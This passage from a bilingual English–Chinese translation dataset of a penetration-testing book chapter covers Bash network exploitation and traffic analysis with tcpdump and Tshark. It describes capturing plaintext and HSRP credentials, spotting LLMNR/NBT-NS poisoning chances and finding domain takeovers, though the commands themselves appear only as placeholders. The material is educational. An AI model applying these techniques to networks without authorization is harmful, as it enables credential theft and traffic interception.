  zh: 在2023年一次客户的渗透测试中，我发现了一个Web应用程序中的命令注入漏洞，攻击者可以将用户输入传递给ping命令。在通过默认凭证进入Web应用的管理界面后，我迅速找到了诊断页面。该应用程序过滤掉了大部分用于Shell命令注入的字符，但忽略了Shell扩展字符。最终，我发现可以在不提供任何身份验证凭证的情况下，向漏洞端点发送请求。虽然应用程序的响应会将你重定向回登录页面，但响应中仍包含了Bash命令的输出。这样就导致了以root用户身份的未经身份验证的命令注入漏洞。
- en: In this section, I’ve provided you with merely a taste of network exploitation
    in Bash. Later chapters will explore more exploitation techniques, as well as
    dive into post-exploitation commands in Bash. Next up, we’ll be taking a look
    at using Bash for network traffic analysis.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一节中，我仅为你提供了Bash中网络利用的一些初步内容。后面的章节将探索更多的利用技巧，并深入讨论Bash中的后期利用命令。接下来，我们将重点介绍如何使用Bash进行网络流量分析。
- en: Network traffic analysis
  id: totrans-218
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 网络流量分析
- en: In this section, we’ll be exploring commands in the Bash shell to capture and
    analyze network traffic.
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一节中，我们将探讨如何使用Bash shell中的命令来捕获和分析网络流量。
- en: Before I jumped into pentesting, I worked in various IT jobs. At one point,
    I earned the **Cisco Certified Network Associate** ( **CCNA** ) certification.
    The things I learned about networking and packet captures have been valuable in
    my pentest ing career.
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 在我开始渗透测试之前，我从事过各种IT工作。曾经，我获得了**思科认证网络工程师**（**CCNA**）证书。我所学到的网络和数据包捕获知识对我的渗透测试职业生涯非常有价值。
- en: There will be times in your pentesting career when you’ll be faced with testing
    systems that have been repeatedly scanned and tested by others before you. At
    some point in time, you’ll either feel like you’re not good enough and question
    your ability, or think that there are no vulnerabilities present. When this happens,
    you’ll be forced to dig deeper and think outside the box to uncover vulnerabilities
    that others have overlooked. Understanding networking at a deeper level can frequently
    be the key to uncovering these vulnerabilities.
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 在你的渗透测试生涯中，可能会遇到一些系统，这些系统已经被别人反复扫描和测试过。到某个时候，你可能会觉得自己不够好，开始质疑自己的能力，或者觉得系统没有漏洞。当这种情况发生时，你就需要更深入地挖掘并跳出思维框架，找出别人忽视的漏洞。更深入地理解网络知识，往往是发现这些漏洞的关键。
- en: Capturing and analyzing network traffic
  id: totrans-222
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 捕获并分析网络流量
- en: One of the first steps I perform at the beginning of an internal network pentest
    is running a packet capture using the **tcpdump** command. **tcpdump** is a command-line
    packet analyzer for Unix-like operating systems. It allows users to capture and
    display the contents of network packets in real time.
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 在我进行内部网络渗透测试的初期步骤中，我首先会使用**tcpdump**命令进行数据包捕获。**tcpdump**是一个用于类Unix操作系统的命令行数据包分析工具，它允许用户实时捕获并显示网络数据包的内容。
- en: 'I use this command:'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 我使用的命令是：
- en: '[PRE23]'
  id: totrans-225
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: Let this run for five minutes, then press the *Ctrl* + *C* key combination to
    stop the capture.
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 让这个程序运行五分钟，然后按下*Ctrl* + *C*键组合来停止抓取。
- en: 'Here’s the explanation:'
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 解释如下：
- en: '**sudo** : The following command requires root privileges. The **sudo** command
    elevates the privileges of the current user.'
  id: totrans-228
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**sudo**：接下来的命令需要root权限。**sudo**命令会提升当前用户的权限。'
- en: '**tcpdump** : **tcpdump** prints out a description of the contents of packets
    on a network interface.'
  id: totrans-229
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**tcpdump**：**tcpdump**会打印出网络接口上数据包内容的描述。'
- en: '**-i eth0** : This is the **tcpdump** argument to specify the network interface.'
  id: totrans-230
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-i eth0**：这是**tcpdump**命令的参数，用来指定网络接口。'
- en: '**-w packetcapture.pcap** : This is the **tcpdump** argument to write the data
    to a file.'
  id: totrans-231
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-w packetcapture.pcap**：这是**tcpdump**命令的参数，用来将数据写入文件。'
- en: Next, I use various **tcpdump** commands to search for interesting data in the
    capture. Once such command is used to detect a default **Hot Standby Router Protocol**
    ( **HSRP** ) password of *cisco* . This **tcpdump** filter checks for the default
    password ( **cisco** ) in the HSRP in the packet capture file. HSRP allows the
    configuration of multiple physical routers into a single logical unit with a shared
    IP address. HSRP attacks involve forcibly taking over the active router’s role
    by injecting a maximum priority value. This can lead to a **Man-In-The-Middle**
    ( **MITM** ) attack. If the system is discovered to be using the default password
    ( **cisco** ), this could lead to someone becoming the router and capturing traffic
    containing sensitive data.
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我使用各种**tcpdump**命令在捕获中搜索有趣的数据。其中一条命令用于检测默认的**热备份路由协议**（**HSRP**）密码为*cisco*。这个**tcpdump**过滤器在数据包捕获文件中检查HSRP中的默认密码（**cisco**）。HSRP允许将多个物理路由器配置为具有共享IP地址的单个逻辑单元。HSRP攻击涉及通过注入最大优先级值强制接管活动路由器的角色。这可能导致**中间人攻击**（**MITM**）。如果发现系统正在使用默认密码（**cisco**），这可能导致某人成为路由器并捕获包含敏感数据的流量。
- en: You can follow along with this exercise by downloading the **HSRP_election.cap**
    file from the book’s GitHub repository.
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以通过从书的GitHub存储库下载**HSRP_election.cap**文件来跟着这个练习。
- en: 'The following command demonstrates how to parse a packet capture file using
    the **tcpdump** command to discover the Cisco HSRP default password in use:'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 以下命令演示了如何使用**tcpdump**命令解析数据包捕获文件，以发现正在使用的Cisco HSRP默认密码：
- en: '[PRE24]'
  id: totrans-235
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'Here’s the output:'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 这是输出：
- en: '![Figure 6.11 – The output of the tcpdump command to display HSRP credentials](image/B22229_06_11.jpg)'
  id: totrans-237
  prefs: []
  type: TYPE_IMG
  zh: '![图6.11 - 使用tcpdump命令显示HSRP凭据的输出](image/B22229_06_11.jpg)'
- en: Figure 6.11 – The output of the tcpdump command to display HSRP credentials
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.11 - 使用tcpdump命令显示HSRP凭据的输出
- en: In this example, we don’t need to preface the **tcpdump** command with **sudo**
    because we’re reading from a capture file.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，我们不需要在**tcpdump**命令前加上**sudo**，因为我们是从一个捕获文件中读取的。
- en: 'Here’s the rest of the explanation:'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: 这是解释的其余部分：
- en: '**-XX** : This is a command to print the data of each packet, including its
    link level header, in hex and ASCII.'
  id: totrans-241
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-XX**：这是一个打印每个数据包数据的命令，包括其链路级标头，以十六进制和ASCII码显示。'
- en: '**-r packetcapture.pcap** : This is a command to read from the packet capture
    file.'
  id: totrans-242
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-r packetcapture.pcap**：这是一个从数据包捕获文件中读取的命令。'
- en: '**udp port 1985 or udp port 2029** : This is a filter to display only records
    with the included source or destination port.'
  id: totrans-243
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**udp端口1985或udp端口2029**：这是一个筛选器，只显示包含源或目的端口的记录。'
- en: '**| grep -B4 cisco** : We pipe the output of the **tcpdump** command to **grep**
    , searching for the word *cisco* . The **-B4** option prints the matched line
    plus four lines before the match. If you want to print lines after the match,
    use **-An** , where **n** is the number of lines.'
  id: totrans-244
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**| grep -B4 cisco**：我们将**tcpdump**命令的输出导入到**grep**中，搜索单词*cisco*。**-B4**选项打印匹配行及其前四行。如果你想打印匹配后的行，请使用**-An**，其中**n**是行数。'
- en: Important note
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 重要提示
- en: Unless you’re onsite sitting at the keyboard of the system that’s running the
    commands, never attempt to perform an MITM attack on HSRP or other network routing
    protocols. If the attack goes awry, you may lose access to your attack system
    and be unable to stop the attack. The resulting network outage will make people
    very unhappy! It is usually best to simply report this vulnerability and move
    on because exploiting it risks causing an outage if you make a mistake.
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 除非你就在运行命令的系统的键盘旁边，否则永远不要尝试对HSRP或其他网络路由协议进行中间人攻击。如果攻击失败，你可能会失去对攻击系统的访问权限，无法停止攻击。由此造成的网络中断会让人们非常不开心！通常最好只报告这个漏洞并继续前进，因为利用它会在犯错时造成中断。
- en: Other common network protocols that are commonly hacked are **Link Local Multicast
    Name Resolution** ( **LLMNR** ) and **NetBIOS Name Service** ( **NBT-NS** ). You
    may believe that when you type a domain name such as **google.com** into the web
    browser, command line, or Explorer, a DNS server resolves the name to an IP address.
    However, the Microsoft Windows operating system will use LLMNR and NBT-NS to attempt
    to locate the hostname on the local network if DNS resolution fails. Since these
    are broadcast protocols and are sent to all hosts, they can be poisoned and potentially
    exploited. This scenario happens frequently inside enterprise networks due to
    software installation or configuration artifacts that have been left behind on
    systems once the host the software connects to has been decommissioned. Just recently
    I captured plaintext SQL server credentials on a pentest because a host was repeatedly
    attempting to connect to a server that no longer existed and therefore could not
    be resolved by DNS.
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 其他常被黑客攻击的常见网络协议是**Link Local Multicast Name Resolution**（**LLMNR**）和**NetBIOS
    Name Service**（**NBT-NS**）。你可能认为当你在Web浏览器、命令行或资源管理器中输入域名如**google.com**时，DNS服务器会将名称解析为IP地址。然而，Microsoft
    Windows操作系统会使用LLMNR和NBT-NS来尝试在本地网络上定位主机名，如果DNS解析失败。由于这些是广播协议并发送给所有主机，它们可能被毒化并潜在被利用。这种情况在企业网络中经常发生，因为软件安装或配置残留在系统上，一旦软件连接的主机被废弃，就会留下这些残留物。就在最近，我在渗透测试中捕获了明文SQL服务器凭据，因为一个主机一直在尝试连接一个不再存在且无法通过DNS解析的服务器。
- en: 'The **tcpdump** command I use to detect LLMNR and NBT-NS is as follows:'
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 我用来检测LLMNR和NBT-NS的**tcpdump**命令如下：
- en: '[PRE25]'
  id: totrans-249
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: This replays the **packetcapture.pcap** file, filtering for any traffic to or
    from UDP ports **137** and **5355** . If anything is detected by this filter,
    you may be able to capture password hashes or relay the connections. These protocols
    are trivial to hack during internal network pentests. We’ll cover this exercise
    in depth later in [*Chapter 10*](B22229_10.xhtml#_idTextAnchor260) .
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 这会重放**packetcapture.pcap**文件，过滤任何发送到或从UDP端口**137**和**5355**的流量。如果这个过滤器检测到任何内容，你可能能够捕获密码哈希或中继连接。这些协议在内部网络渗透测试中很容易被黑客攻击。我们稍后会在[*第10章*](B22229_10.xhtml#_idTextAnchor260)中深入讨论这个练习。
- en: The following example captures credentials sent over plaintext HTTP. You should
    always provide proof of concept exploits in your pentest report findings whenever
    possible. For example, when you report a finding of plaintext services such as
    HTTP or FTP, providing a screenshot showing how the credentials can be captured
    shows the system owner why it’s bad to use plaintext services.
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 以下示例捕获了通过明文HTTP发送的凭据。在可能的情况下，你应该始终在你的渗透测试报告中提供概念证明漏洞利用。例如，当你报告发现明文服务如HTTP或FTP时，提供一个截图展示如何捕获凭据，向系统所有者说明使用明文服务的危害。
- en: 'In your terminal, run the following command to filter for plaintext HTTP communication:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 在你的终端中，运行以下命令来过滤明文HTTP通信：
- en: '[PRE26]'
  id: totrans-253
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: 'The following figure shows the pentester capturing the plaintext credentials
    in the command output:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 以下图显示了渗透测试人员在命令输出中捕获明文凭据的情况：
- en: '![Figure 6.12 – Capturing the plaintext credentials in HTTP communication](image/B22229_06_12.jpg)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
  zh: '![图6.12 - 捕获HTTP通信中的明文凭据](image/B22229_06_12.jpg)'
- en: Figure 6.12 – Capturing the plaintext credentials in HTTP communication
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.12 - 捕获HTTP通信中的明文凭据
- en: Another packet capture tool I frequently use is Tshark. Tshark is a powerful
    command-line network protocol analyzer that comes bundled with the popular Wireshark
    **graphical user interface** ( **GUI** ) network protocol analyzer. While Wireshark
    provides a user-friendly interface for capturing and analyzing network traffic,
    Tshark allows you to perform similar tasks from the command line. Tshark allows
    you to use more complex capture filters than those provided by Tcpdump.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 我经常使用的另一个数据包捕获工具是Tshark。Tshark是一个功能强大的命令行网络协议分析器，它与流行的Wireshark **图形用户界面**（**GUI**）网络协议分析器捆绑在一起。虽然Wireshark提供了一个用户友好的界面来捕获和分析网络流量，但Tshark允许你从命令行执行类似的任务。Tshark允许你使用比Tcpdump提供的更复杂的捕获过滤器。
- en: 'If Tshark is not already installed on your system, you can get it by installing
    Wireshark. If you want to use Tshark on a headless system, you can install it
    without installing the Wireshark GUI on Kali using the following command:'
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你的系统上还没有安装Tshark，你可以通过安装Wireshark来获取它。如果你想在无头系统上使用Tshark，你可以使用以下命令在Kali上安装它而不安装Wireshark
    GUI：
- en: '[PRE27]'
  id: totrans-259
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: One of my use cases for Tshark is when I’m performing a web application pentest.
    The whole time I’m testing the website, I have Tshark running in my terminal.
    This allows me to discover domain takeover vulnerabilities. Imagine for a moment
    that the web developers once used a third-party web service to integrate content
    into the website. Somewhere along the way, they may have let that third-party
    domain go or let the domain name expire. If you can register that domain name,
    it may result in the ability to inject content into the web application.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 我使用 Tshark 的一个场景是进行 Web 应用渗透测试。在测试网站的整个过程中，我都在终端运行 Tshark。这让我能够发现域名接管漏洞。假设一名
    Web 开发者曾经使用过第三方 Web 服务将内容集成到网站中。在某个时刻，他们可能已经放弃了那个第三方域名或让域名过期。如果你能注册那个域名，可能就能将内容注入到
    Web 应用中。
- en: 'Here’s a real-world example of a hacker using this for a bug bounty:'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 这是黑客使用此功能进行漏洞奖励的一个实际案例：
- en: '![Figure 6.13 – A bug bounty hunter discovers a domain takeover opportunity](image/B22229_06_13.jpg)'
  id: totrans-262
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.13 – 一名漏洞奖励猎人发现了一个域名接管机会](image/B22229_06_13.jpg)'
- en: Figure 6.13 – A bug bounty hunter discovers a domain takeover opportunity
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.13 – 一名漏洞奖励猎人发现了一个域名接管机会
- en: 'The following command will alert you to potential domain name takeovers:'
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 以下命令将提醒你潜在的域名接管：
- en: '[PRE28]'
  id: totrans-265
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: 'The following figure shows what you will see when a domain name can’t be resolved
    by your DNS server:'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 以下图像显示当你的 DNS 服务器无法解析某个域名时，你将看到的内容：
- en: '![Figure 6.14 – Example output shows a possible domain takeover opportunity](image/B22229_06_14.jpg)'
  id: totrans-267
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.14 – 示例输出显示了可能的域名接管机会](image/B22229_06_14.jpg)'
- en: Figure 6.14 – Example output shows a possible domain takeover opportunity
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.14 – 示例输出显示了可能的域名接管机会
- en: If I find this output in my console during my web application pentest, I attempt
    to locate the resource in the application where this domain is being called by
    searching my proxy history. Once I find the resource that’s calling the domain,
    I investigate further to determine whether I can register the domain name and
    then determine the impact on the application. This is a possible domain takeover
    opportunity.
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在我的 Web 应用渗透测试过程中，在控制台中发现这个输出，我会尝试在应用中定位这个域名被调用的资源，通过查找我的代理历史记录。一旦找到调用该域名的资源，我会进一步调查，确定是否可以注册该域名，并评估对应用的影响。这就是一个可能的域名接管机会。
- en: Having explored an introduction to capturing and analyzing network traffic,
    let’s move into the next section and dive deeper into packet captures.
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 在探索了捕获和分析网络流量的介绍后，让我们进入下一部分，深入研究数据包捕获。
- en: Interpreting packet captures
  id: totrans-271
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 解释数据包捕获
- en: 'Tshark fields allow you to specify which specific pieces of information you
    want to extract and display from the captured packets. By using fields, you can
    focus on the relevant data and filter out the noise, making it easier to analyze
    and interpret the network traffic. There are two basic ways to use fields: display
    ( **-e** ) and filter ( **-Y** ) fields. Display fields specify what you want
    to display in the output. Filter fields provide a way to filter for traffic that
    matches a pattern.'
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: Tshark 字段允许你指定想要从捕获的数据包中提取并显示的具体信息。通过使用字段，你可以集中关注相关数据并过滤掉杂乱的信息，从而使得分析和解释网络流量变得更加容易。使用字段有两种基本方式：显示字段（**-e**）和过滤字段（**-Y**）。显示字段指定你希望在输出中显示的内容。过滤字段提供了一种根据模式过滤流量的方法。
- en: 'The following should simplify the difference between display and filter fields:'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 以下内容将简化显示字段和过滤字段之间的区别：
- en: '**-e** extracts specific fields from packet dissection'
  id: totrans-274
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-e** 从数据包解析中提取特定字段'
- en: '**-Y** applies a display filter to packets'
  id: totrans-275
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-Y** 对数据包应用显示过滤器'
- en: '**-e** selects what to display, **-Y** filters what’s displayed'
  id: totrans-276
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-e** 选择要显示的内容，**-Y** 过滤显示的内容'
- en: '**-e** is used for the output format, **-Y** for conditional filtering'
  id: totrans-277
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-e** 用于输出格式，**-Y** 用于条件过滤'
- en: 'Use both to extract filtered fields: **-Y "http.request" -** **e http.host**'
  id: totrans-278
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用两者来提取过滤后的字段：**-Y "http.request" -** **e http.host**
- en: 'For example, to display only the source and destination IP addresses of each
    packet, you would use the following command:'
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，要仅显示每个数据包的源 IP 地址和目标 IP 地址，你可以使用以下命令：
- en: '[PRE29]'
  id: totrans-280
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: 'To apply a filter based on a field value, you can use the **-Y** or **--display-filter**
    option followed by the filter expression. For example, to display only HTTP traffic,
    you can use the following:'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 要根据字段值应用过滤器，你可以使用 **-Y** 或 **--display-filter** 选项，后跟过滤表达式。例如，要仅显示 HTTP 流量，可以使用以下命令：
- en: '[PRE30]'
  id: totrans-282
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: 'You can combine field filters with logical operators such as **and** , **or**
    , and **not** to create more complex filter expressions. For example, to display
    only HTTP traffic originating from a specific IP address, you can use the following:'
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以将字段过滤器与逻辑运算符如 **and**、**or** 和 **not** 结合，创建更复杂的过滤表达式。例如，要显示仅来自特定 IP 地址的
    HTTP 流量，可以使用以下表达式：
- en: '[PRE31]'
  id: totrans-284
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: 'There are hundreds of fields available in Tshark across all the different protocols
    it understands. However, as a cybersecurity professional, you’ll find yourself
    using a core set of fields most of the time. Here are the Tshark fields I’ve used
    most often in my work:'
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: Tshark 中有数百个可用字段，涵盖它理解的所有协议。然而，作为一名网络安全专业人士，你会发现自己大多数时候使用的是一组核心字段。以下是我在工作中最常用的
    Tshark 字段：
- en: '**ip.src** : The source IP address'
  id: totrans-286
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**ip.src** : 源 IP 地址'
- en: '**ip.dst** : The destination IP address'
  id: totrans-287
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**ip.dst** : 目标 IP 地址'
- en: '**ip.proto** : The IP protocol (TCP, UDP, ICMP, etc.)'
  id: totrans-288
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**ip.proto** : IP 协议（TCP、UDP、ICMP 等）'
- en: '**tcp.srcport** : The TCP source port'
  id: totrans-289
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**tcp.srcport** : TCP 源端口'
- en: '**tcp.dstport** : The TCP destination port'
  id: totrans-290
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**tcp.dstport** : TCP 目标端口'
- en: '**udp.srcport** : The UDP source port'
  id: totrans-291
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**udp.srcport** : UDP 源端口'
- en: '**udp.dstport** : The UDP destination port'
  id: totrans-292
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**udp.dstport** : UDP 目标端口'
- en: '**frame.time** : The timestamp of when the packet was captured'
  id: totrans-293
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**frame.time** : 数据包捕获的时间戳'
- en: '**http.request.method** : The HTTP request method ( **GET** , **POST** , etc.)'
  id: totrans-294
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**http.request.method** : HTTP 请求方法（**GET**、**POST** 等）'
- en: '**http.request.uri** : The URI of the HTTP request'
  id: totrans-295
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**http.request.uri** : HTTP 请求的 URI'
- en: '**http.user_agent** : The User-Agent string of the HTTP client'
  id: totrans-296
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**http.user_agent** : HTTP 客户端的 User-Agent 字符串'
- en: '**http.host** : The Host header of the HTTP request'
  id: totrans-297
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**http.host** : HTTP 请求的 Host 头部'
- en: '**dns.qry.name** : The hostname queried in a DNS request'
  id: totrans-298
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**dns.qry.name** : DNS 请求中查询的主机名'
- en: '**dns.resp.name** : The hostname returned in a DNS response'
  id: totrans-299
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**dns.resp.name** : DNS 响应中返回的主机名'
- en: '**dns.resp.type** : The query type of a DNS response ( **A** , **AAAA** , **CNAME**
    , etc.)'
  id: totrans-300
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**dns.resp.type** : DNS 响应的查询类型（**A**、**AAAA**、**CNAME** 等）'
- en: The source and destination IP address fields ( **ip.src** / **dst** ) are useful
    for identifying the endpoints involved in the communication. You can quickly spot
    suspicious IPs or track conversations between hosts.
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 源和目标 IP 地址字段（**ip.src** / **dst**）对于识别参与通信的端点非常有用。你可以迅速发现可疑的 IP 地址或跟踪主机之间的对话。
- en: The IP protocol field ( **ip.proto** ) tells you whether the traffic is TCP,
    UDP, ICMP, or something else. This helps categorize the traffic at a high level.
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: IP 协议字段（**ip.proto**）告诉你流量是 TCP、UDP、ICMP 还是其他。这有助于对流量进行高层次分类。
- en: The source and destination port fields ( **tcp.srcport** , **udp.dstport** ,
    etc.) identify the network service being used, such as HTTP on port **80** , HTTPS
    on **443** , DNS on **53** , and so on. Monitoring these can reveal unauthorized
    services on your network.
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: 源和目标端口字段（**tcp.srcport**、**udp.dstport** 等）可以标识使用的网络服务，例如端口 **80** 上的 HTTP、端口
    **443** 上的 HTTPS、端口 **53** 上的 DNS 等。监控这些字段可以揭示你网络中的未经授权的服务。
- en: The **frame.time** field adds a timestamp to each packet, which is critical
    for analyzing the sequence of events and spotting things such as replay attacks
    or password guessing.
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: '**frame.time** 字段为每个数据包添加时间戳，这对于分析事件顺序以及发现如重放攻击或密码猜测等情况至关重要。'
- en: For investigating web traffic, the HTTP method, URI, user agent, and host fields
    provide insight into potentially malicious requests, vulnerable web apps, malware
    C2 traffic, and more.
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 对于调查 Web 流量，HTTP 方法、URI、用户代理和主机字段能提供关于潜在恶意请求、易受攻击的 Web 应用、恶意软件 C2 流量等的洞察。
- en: Finally, the DNS query and response fields are invaluable for incident response
    and threat hunting, allowing you to track domain lookups that could be associated
    with malware or data exfiltration.
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，DNS 查询和响应字段在事件响应和威胁狩猎中非常宝贵，帮助你追踪与恶意软件或数据外泄相关的域名查询。
- en: There are many other useful fields, but these are the ones I lean on the most.
    Combine them with Tshark’s powerful filtering capabilities and you have an indispensable
    tool for inspecting suspicious traffic, investigating incidents, and hunting for
    threats.
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 还有许多其他有用的字段，但这些是我最常依赖的。结合 Tshark 强大的过滤功能，你就拥有了一个检查可疑流量、调查事件和捕捉威胁的必备工具。
- en: Mastering Tshark takes practice, but it’s well worth the effort. Being able
    to quickly parse out relevant details from raw network traffic is a core skill
    for cybersecurity analysts and pentesters. Knowing your way around these common
    fields is a great start. From there, you can dig into more advanced protocol-specific
    fields as needed.
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: 精通 Tshark 需要练习，但这绝对是值得的。能够快速从原始网络流量中解析出相关细节是网络安全分析员和渗透测试人员的核心技能。熟悉这些常见字段是一个很好的开始。从那里，你可以根据需要深入研究更高级的协议特定字段。
- en: The nice thing about Tshark is that it’s extremely flexible; if there’s a field
    you need, chances are, Tshark can extract it. Don’t be afraid to explore the full
    list of fields ( **tshark -G fields** ) and experiment. Over time, you’ll build
    up your own toolkit of go-to fields and filters that will make you a faster, more
    effective analyst. Once you’ve become fluent in using Tshark fields, combine them
    with what you’ve learned about Bash scripting to automate the repetitive, boring
    stuff and supercharge your career.
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: Tshark 的好处在于它非常灵活；如果有你需要的字段，Tshark 很可能可以提取出来。不要害怕探索完整的字段列表（**tshark -G fields**）并进行实验。随着时间的推移，你将建立起自己的常用字段和过滤器工具包，使你成为一个更快速、更有效的分析员。一旦你熟练掌握了使用
    Tshark 字段的技巧，结合你对 Bash 脚本编写的了解，自动化重复、枯燥的工作，让你的职业生涯更上一层楼。
- en: Summary
  id: totrans-310
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, you learned how to leverage Bash to configure, troubleshoot,
    and exploit networking in Unix/Linux environments. You now have the skills to
    access network configuration details, interact with various network components,
    and use Bash scripting to exploit vulnerable network services.
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，你学会了如何利用 Bash 在 Unix/Linux 环境中配置、排除故障和利用网络。你现在具备了访问网络配置细节、与各种网络组件交互以及使用
    Bash 脚本利用易受攻击的网络服务的技能。
- en: You started with the networking basics, learning how to identify network configuration
    details and perform network diagnostics using Bash commands. Then you progressed
    to scripting network enumeration, automating tools to scan networks and enumerate
    services. Next, you explored how Bash can be used for network exploitation, crafting
    scripts to target vulnerabilities. Finally, you got an introduction to analyzing
    network traffic directly in Bash to extract useful information.
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 你从网络基础知识开始学习，学会了如何识别网络配置细节并使用 Bash 命令执行网络诊断。然后你进一步学习了编写网络枚举脚本，自动化工具扫描网络并枚举服务。接着，你探索了如何利用
    Bash 进行网络利用，编写脚本以针对漏洞。最后，你初步了解了如何直接在 Bash 中分析网络流量以提取有用信息。
- en: With the knowledge gained in this chapter, you’re now equipped to write powerful
    Bash scripts for a wide range of networking tasks, from basic administration to
    advanced pentest. The skills learned will serve you well whether securing your
    own networks or testing those of others.
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: 通过本章学到的知识，你现在具备了为各种网络任务编写强大的 Bash 脚本的能力，从基本管理到高级渗透测试。所学技能将为你服务良好，无论是保护自己的网络还是测试他人的网络。
- en: In the next chapter, we’ll explore parallel processing to speed up time-sensitive
    Bash scripts.
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
